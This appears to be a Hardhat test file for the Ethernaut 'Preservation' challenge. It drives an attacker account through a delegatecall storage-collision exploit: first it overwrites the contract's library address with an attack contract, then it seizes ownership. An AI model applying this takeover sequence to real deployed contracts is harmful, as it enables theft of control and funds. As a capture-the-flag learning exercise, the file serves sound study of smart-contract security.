import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";

import { Preservation } from "../typechain-types/contracts/Preservation/Preservation.sol";
import { LibraryContract } from "../typechain-types/contracts/Preservation/Preservation.sol";
import { PreservationAttack } from "../typechain-types/contracts/Preservation/PreservationAttack";

describe("Preservation", function () {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let preservation: Preservation;
  let libraryContract1: LibraryContract;
  let libraryContract2: LibraryContract;
  let preservationAttack: PreservationAttack;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    const LibraryContractFactory = await ethers.getContractFactory(
      "LibraryContract"
    );
    libraryContract1 = await LibraryContractFactory.connect(owner).deploy();
    libraryContract2 = await LibraryContractFactory.connect(owner).deploy();

    const PreservationFactory = await ethers.getContractFactory("Preservation");
    preservation = await PreservationFactory.connect(owner).deploy(
      libraryContract1.address,
      libraryContract2.address
    );

    const PreservationAttackFactory = await ethers.getContractFactory(
      "PreservationAttack"
    );
    preservationAttack = await PreservationAttackFactory.connect(
      attacker
    ).deploy();
  });

  describe("Deployment", function () {
    it("Owner should own contract", async function () {
      expect(await preservation.owner()).to.equal(owner.address);
    });

    it("LibraryContract addresses should be set", async function () {
      expect(await preservation.timeZone1Library()).to.equal(
        libraryContract1.address
      );
      expect(await preservation.timeZone2Library()).to.equal(
        libraryContract2.address
      );
    });
  });

  describe("Claim ownership of the Preservation Contract", function () {
    before(async function () {
      await preservation
        .connect(attacker)
        .setFirstTime(preservationAttack.address);
    });

    it("LibraryContract1 address should be the address of PreservationAttack contract", async function () {
      expect(await preservation.timeZone1Library()).to.equal(
        preservationAttack.address
      );
    });

    it("Preservation owner should be attacker", async function () {
      await preservation.connect(attacker).setFirstTime(10);
      expect(await preservation.owner()).to.equal(attacker.address);
    });
  });
});
